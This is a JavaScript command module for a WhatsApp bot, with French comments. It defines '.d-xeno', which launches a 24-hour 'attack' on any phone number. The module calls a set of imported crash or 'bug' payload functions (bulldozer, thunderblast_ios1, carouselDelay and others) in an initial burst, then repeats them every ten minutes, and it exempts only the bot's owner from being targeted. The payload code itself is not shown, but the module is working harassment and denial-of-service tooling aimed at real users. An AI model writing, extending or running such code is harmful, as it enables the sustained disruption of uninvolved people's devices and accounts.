const bugUtils = require("../../utils/bugUtils")
const { OWNER_NUM } = require("../../config")

// 🔥 stockage actif
const activeXeno = {}

module.exports = {
    name: "d-xeno",
    description: "Attaque simultanée (24h)",
    usage: ".d-xeno <numéro>",

    async execute(sock, msg, args) {

        const remoteJid = msg.key.remoteJid
        const senderJid = msg.key.participant || remoteJid
        const q = args[0]

        // 🔥 STOP MANUEL
        if (q === "off") {
            if (activeXeno[remoteJid]) {
                clearInterval(activeXeno[remoteJid])
                delete activeXeno[remoteJid]

                return sock.sendMessage(remoteJid, {
                    text: "🛑 D-XENO arrêté manuellement"
                }, { quoted: msg })
            }

            return sock.sendMessage(remoteJid, {
                text: "⚠️ Aucun XENO actif ici"
            }, { quoted: msg })
        }

        if (!q) {
            return sock.sendMessage(remoteJid, {
                text: `
╭╌╌❖ \`𝐃-𝐗𝐄𝐍𝐎\` ❖╌╌╌╌╌❍
╎➭ saisie bien l'attaque :
╎ \`𝐝-𝐱𝐞𝐧𝐨 237XXXXXXXX\`
╰╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌❍ 
`
            }, { quoted: msg })
        }

        const number = q.replace(/[^0-9]/g, "")
        const target = number + "@s.whatsapp.net"

        if (
            target === OWNER_NUM + "@s.whatsapp.net" &&
            senderJid !== OWNER_NUM + "@s.whatsapp.net" &&
            !msg.key.fromMe
        ) {
            return sock.sendMessage(remoteJid, {
                text: `🚫 Vous ne pouvez pas utiliser cette commande contre le propriétaire du bot.`
            }, { quoted: msg })
        }

        // 🔥 anti double lancement
        if (activeXeno[remoteJid]) {
            return sock.sendMessage(remoteJid, {
                text: "⚠️ Une attaque est déjà en cours"
            }, { quoted: msg })
        }

        await sock.sendMessage(remoteJid, {
            image: { url: "https://files.catbox.moe/ihbx2b.jpg" },
            caption: `
╭❍𓅃 𝐃-𝐗𝐄𝐍𝐎 𓅃❍╌╌╌╌╌╌❍
╎╭❖ 🎯 Cible  : ${number}
╎╰❖ 📌 Action : Progressif
╎╭❖ 🔄 Durée  : \`1 Jour\`
╎╰❖ 🔐 Protection : Anti-Spam 
╎
╎ \`Exécution en cours 📡…\`
╰╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌❍
`
        }, { quoted: msg })

        try {

            // 🔥 burst initial (inchangé)
            await Promise.all([
                bugUtils.apaya(sock, target),
                bugUtils.alldelay(sock, target),
                bugUtils.bulldozer(sock, target),
                bugUtils.allProtocol(sock, target),
                bugUtils.thunderblast_ios1(sock, target),
                bugUtils.callHome(sock, target),
                bugUtils.carousels2(sock, target),
                bugUtils.CarouselX(sock, target),
                bugUtils.carouselDelay(sock, target)
            ])

            await sock.sendMessage(remoteJid, {
                text: `🔥 D-XENO burst lancé sur ${number}
◈ Toutes les fonctions simultanées
◈ Maintien en cours…`
            }, { quoted: msg })

            const startTime = Date.now()
            const duration = 24 * 60 * 60 * 1000
            const intervalTime = 10 * 60 * 1000

            // 🔥 remplace while par interval
            activeXeno[remoteJid] = setInterval(async () => {
                try {

                    if (Date.now() - startTime > duration) {

                        clearInterval(activeXeno[remoteJid])
                        delete activeXeno[remoteJid]

                        await sock.sendMessage(remoteJid, {
                            text: `
╭╌╌╌❍\`𓅃 𝐑𝐀𝐏𝐏𝐎𝐑𝐓 𓅃\`❍╌╌❍
╎✎ Cycle 𝐉𝐨𝐮𝐫𝐧𝐚𝐥𝐢𝐞𝐫 𝐚𝐜𝐡𝐞𝐯𝐞́
╎✎ 𝐄𝐱𝐞́𝐜𝐮𝐭𝐢𝐨𝐧 𝐬𝐭𝐚𝐛𝐢𝐥𝐢𝐬𝐞́
╎
╎🎯 𝐅𝐢𝐧𝐚𝐥𝐢𝐭𝐞́ 𝐝𝐞 𝐥'𝐞𝐱𝐞𝐜𝐮𝐭𝐢𝐨𝐧 : 𝐮𝐧𝐢𝐟𝐨𝐫𝐦𝐞
╰╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌❍
`
                        }, { quoted: msg })

                        return
                    }

                    let hourCount = 0

                    while (hourCount < 20) {
                        await Promise.all([
                            bugUtils.carouselDelay(sock, target),
                            bugUtils.carouselDelay(sock, target),
                            bugUtils.thunderblast_ios1(sock, target),
                            bugUtils.apaya(sock, target)
                        ])

                        hourCount += 4
                        await new Promise(r => setTimeout(r, 3 * 60 * 1000))
                    }

                } catch (e) {
                    console.log("XENO error:", e.message)
                }

            }, intervalTime)

        } catch (err) {
            console.error("Erreur D-XENO:", err)

            await sock.sendMessage(remoteJid, {
                text: `⚠️ ⛔ 𝐀𝐑𝐑𝐄̂𝐓-𝐃 𝐗𝐄𝐍𝐎
Erreur pendant le burst`
            }, { quoted: msg })
        }
    }
}